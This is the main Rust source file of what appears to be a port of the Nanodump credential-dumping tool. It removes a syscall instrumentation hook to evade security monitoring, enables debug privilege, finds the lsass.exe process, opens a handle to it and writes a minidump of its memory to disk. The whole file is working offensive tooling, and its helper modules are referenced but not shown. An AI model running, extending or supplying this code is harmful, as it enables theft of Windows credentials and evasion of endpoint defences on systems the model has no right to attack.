extern crate alloc;

mod utils;
mod core;
mod nt;
mod winapi;

use std::process::exit;
use clap::{ArgAction, Parser};
use log::{debug, error, info, trace, warn};
use nt::dump::model::{DumpContext, MINIDUMP_IMPL_VERSION, MINIDUMP_SIGNATURE, MINIDUMP_VERSION};
use crate::winapi::finder::get_pid_by_name;
use crate::core::process::get_name_by_pid_nt;
use crate::core::dump::{duplicate_lsass_handle, open_handle_to_lsass};
use crate::core::permission::{get_lsass_clone_permissions, get_lsass_min_permissions};
use crate::core::privilege::{enable_debug_privilege, is_debug_privilege_enabled};
use crate::nt::minidump::dump_process;
use crate::nt::dump::nanodump::nano_dump_write_dump;
use crate::utils::process_instrumentation_callback::remove_syscall_callback_hook;
use crate::utils::utils::{get_full_path, write_buffer};

/// Nanodump - Process memory dumping tool
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Get core ID
    #[arg(long, default_value_t = 0)]
    lsass_pid: u32,

    /// Only print lsass pid value
    #[arg(long)]
    get_pid_and_leave: bool,

    /// Increase verbosity (-v, -vv, -vvv)
    #[arg(short, long, action = ArgAction::Count)]
    verbose: u8,

    /// Quiet mode (no output)
    #[arg(short, long)]
    quiet: bool,

    /// Write dump to disk
    #[arg(short, long)]
    write_dump_to_disk: bool,

    /// Dump path
    #[arg(short, long, default_value= "dump.bin")]
    path: String,
}


fn main() {
    let args = Args::parse();

    let log_level = if args.quiet {
        log::LevelFilter::Off
    } else {
        match args.verbose {
            0 => log::LevelFilter::Info,
            1 => log::LevelFilter::Debug,
            2 => log::LevelFilter::Trace,
            _ => log::LevelFilter::Trace,
        }
    };

    env_logger::Builder::from_default_env().filter_level(log_level).init();

    debug!("========== PARAMETERS ==========");

    debug!("get-pid           : {}", args.lsass_pid);
    debug!("get_pid_and_leave : {}", args.get_pid_and_leave);
    debug!("verbosity         : {}", args.verbose);
    debug!("quiet             : {}", args.quiet);
    debug!("write_dump_to_disk: {}", args.write_dump_to_disk);
    debug!("path              : {}", args.path);

    debug!("======== END PARAMETERS =========\n");

    if args.write_dump_to_disk {
        debug!("========== CREATE OUTPUT FILE ==========");

        let full_path = get_full_path(args.path.as_str());
        match full_path {
            Ok(path) => {

            }
            Err(e) => {
                error!("{}", e);
                return;
            }

        }

        debug!("======== END CREATE OUTPUT FILE ========");
    }


    debug!("========== REMOVING CALLBACK HOOK ==========");
    info!("Trying to remove callback hook...");
    if remove_syscall_callback_hook(){
        info!("  -> Callback hook successfully removed");
    }
    else {
        error!("Failed to remove syscall hook");
    }
    debug!("======== END REMOVING CALLBACK HOOK ========\n");

    debug!("========== ENABLING DEBUG PRIVILEGES ==========");
    info!("Trying to enable debug privileges...");
    enable_debug_privilege();
    if is_debug_privilege_enabled() {
        info!("  -> Debug privilege successfully enabled");
    } else {
        error!("Debug privilege not enabled");
        exit(1)
    }
    debug!("======== END DEBUG PRIVILEGES ========\n");

    //let local_pid = std::process::id();
    //debug!("PID local: {}", local_pid);

    debug!("========== LSASS PID ==========");
    info!("Trying to obtain lsass pid...");

    let lsass_pid: Option<u32>;

    if args.lsass_pid == 0{
        info!("  -> Searching pid by name lsass.exe");
        lsass_pid = get_pid_by_name("lsass.exe");
        if lsass_pid.is_none() {
            error!("Process non trouvé");
            exit(1);
        }
    }
    else {
        info!("  -> pid provided by user");
        lsass_pid = Some(args.lsass_pid);
    }
    let lsass_pid = lsass_pid.unwrap();
    info!("    -> LSASS process ID: {}", lsass_pid);
    if args.get_pid_and_leave{
        debug!("Ending process due to get_pid_and_leave...");
        return;
    }
    debug!("======== END LSASS PID ==========\n");

    debug!("========== LSASS PERMISSION ==========");
    let permission = get_lsass_min_permissions();
    debug!("Permission: {}", permission);
    debug!("======== END LSASS PERMISSION ========\n");

    debug!("========== LSASS HANDLE ==========");
    info!("Trying to obtain lsass handle...");
    let h_process = open_handle_to_lsass(lsass_pid, false, permission, 0);
    if h_process.is_none(){
        error!("  -> Unable to obtain handle");
        exit(1);
    }
    let h_process = h_process.unwrap();
    info!("  -> Lsass handle successfully obtained");
    debug!("======== END LSASS HANDLE ========\n");

    debug!("========== DUMPING MEMORY ==========");
    info!("Trying to dump memory...");
    //let _ = dump_process(hprocess.unwrap(), lsass_pid,"lsass_dump.dmp");

    let mut dc : DumpContext = DumpContext {
        h_process,
        base_address : std::ptr::null_mut(),
        rva :0,
        dump_max_size : 0x0c800000,
        signature : MINIDUMP_SIGNATURE,
        version : MINIDUMP_VERSION,
        implementation_version : MINIDUMP_IMPL_VERSION,
        buf : Vec::new(),
    };

    if nano_dump_write_dump(&mut dc).is_ok(){
        if args.write_dump_to_disk {
            info!("  -> Writing dump at {}", args.path);
            let _ = write_buffer(&*args.path, &dc.buf);
        }
    }
    info!("Memory dumped successfully");
    debug!("======== END DUMPING MEMORY ========\n")

}


